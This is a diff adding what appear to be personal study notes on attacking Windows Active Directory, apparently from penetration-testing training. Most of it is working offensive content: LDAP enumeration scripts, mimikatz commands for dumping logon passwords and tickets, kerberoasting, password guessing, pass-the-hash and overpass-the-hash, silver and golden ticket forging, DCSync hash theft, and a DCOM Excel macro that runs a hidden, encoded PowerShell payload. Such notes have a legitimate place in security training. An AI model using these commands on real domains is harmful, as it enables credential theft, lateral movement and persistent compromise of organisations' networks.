@@ -1,0 +1,225 @@
+Enum
+
+traditional approach
+net user
+net user /domain
+net user uname /domain
+net group /domain
+======
+modern approach
+
+PS script
+
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+$PDC = ($domainObj.PdcRoleOwner).Name
+
+$SearchString = "LDAP://"
+
+$SearchString += $PDC + "/"
+
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+
+$SearchString += $DistinguishedName
+
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+
+$Searcher.SearchRoot = $objDomain
+
+$Searcher.filter="samAccountType=805306368"
+
+$Result = $Searcher.FindAll()
+
+Foreach($obj in $Result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop
+    }
+    
+    Write-Host "------------------------"
+}
+
+for nested groups change
+
+$Searcher.filter="(objectClass=Group)"
+
+Foreach($obj in $Result)
+{
+    $obj.Properties.name
+}
+or
+    $obj.Properties.member
+======
+Currently Logged on Users
+
+Import-Module .\PowerView.ps1
+
+Get-NetLoggedon -ComputerName hostname
+Get-NetSession -ComputerName dc01
+
+======
+Enum Through Service Principal Names
+
+modify our enum script
+$Searcher.filter="serviceprincipalname=*http*"
+nslookup ^name^
+
+======
+AD Auth
+
+NTLM hash
+
+In the first authentication step, the computer calculates a cryptographic hash, called the NTLM hash,
+from the user's password. Next, the client computer sends the user name to the server, which returns a
+random value called the nonce or challenge. The client then encrypts the nonce using the NTLM hash, now known as a response, and sends it to the server.
+
+The server forwards the response along with the username and the nonce to the domain controller.
+The validation is then performed by the domain controller, since it already knows the NTLM hash of all users.
+The domain controller encrypts the challenge itself with the NTLM hash of the supplied username and compares
+it to the response it received from the server. If the two are equal, the authentication request is successful.
+
+Kerberos - https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
+
+Cached Credential Storage and Retrieval
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::tickets
+
+
+Service Account Attacks
+request service ticket from kerberos
+
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -
+ArgumentList 'HTTP/webserver.corp.com'
+
+klist - listing kerberos tickets for the current user
+
+kerberos::list /export
+once we have the ticket we can try decrypting or brute forcing (kerberoasting)
+
+Low and Slow password guessing
+via LDAP and ADSI
+net accounts - lockout threshold indicates how many login attempts before lockout
+
+script for low and slow
+
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+  
+$PDC = ($domainObj.PdcRoleOwner).Name
+
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+
+$SearchString += $DistinguishedName
+
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "uname", "pass")
+==========================================================================================
+AD lateral movement
+
+Pass the Hash
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //1.2.3.4 cmd 
+
+
+Overpass the Hash
+over abuse NTLM user hash to gain a full Kerberos Ticket Granting Ticket
+
+sekurlsa::logonpasswords
+grab NTLM hash
+sekurlsa:pth /user:uname /domain:corp.com /ntlm:ntlm_hash /run:PowerShell.exe
+new powershell session, need to perform interactive login to get TGT, example auth to a network share on the domain controller
+net use \\dc01
+klist
+once we got the TGT we can reuse it
+.\PsExec.exe \\dc01 cmd.exe
+
+
+Pass the Ticket
+
+for a silver ticket we need the SID of the domain which has the below structure
+S-R-I-S
+S-revision level(usually 1)-identifier_authority_value(often 5)-one or more subauthority valuse
+S-1-5-21-2536614016-3629645862-1229671035-1226
+the last part (in this case 1226) is RID - relative id representing the specific object in the domain
+whoami /user
+
+mimikatz.exe
+kerberos::purge
+kerberos::list
+kerberos::golden /user:uname /domain:corp.com /sid:S-1-5-21-nums-nums-nums /target:CorpWebServer.corp.com /service:HTTP /rc4:hash_of_the_iis_service_acc /ptt
+
+
+Distributed Component Object Model
+DCOM over RPC on TCP 135; objects related to Microsoft Office allow lateral movement through the use of outlook and PowerPoint
+
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "1.2.3.4"))
+
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+
+$RemotePath = "\\1.2.3.4\c$\myexcel.xls"
+
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+
+$Path = "\\1.2.3.4\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+
+$temp = [system.io.directory]::createDirectory($Path)
+
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+
+$com.Run("mymacro")
+
+we can run macros with this script and do an HTA attack
+msfvenom to generate the payload
+encode with base64
+python to split the command into smaller chunks
+str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
+
+n = 50
+
+for i in range(0, len(str), n):
+	print "Str = Str + " + '"' + str[i:i+n] + '"'
+   
+update macro
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
+    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
+    ...
+    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
+    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
+    Shell (Str)
+End Sub
+==========================================================================================
+AD persistence
+
+Golden Tickets
+
+if we can get hands on krbtst pass hash we can make a golden ticket(custom TGT)
+
+with access to account that is a member of the Domains Admin group
+mimikatz.exe
+privilege::debug
+psadump::lsa /patch
+and we get the krbtgt password hash
+kerberos::purge
+kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602876687-2787534411-2599479668 /krbtgt:75b60230a2394a812000dbfad8416075 /ptt
+
+
+Domain Controller Synchronization
+steal password hashes for all admin users in the domain
+NTDS.dit
+
+because usually domains have more than 1 DC for redundancy, we can ask for a rogue update
+we just need correct SID/be an admin
+
+lsadump::dcsync /user:Administrator
+
+
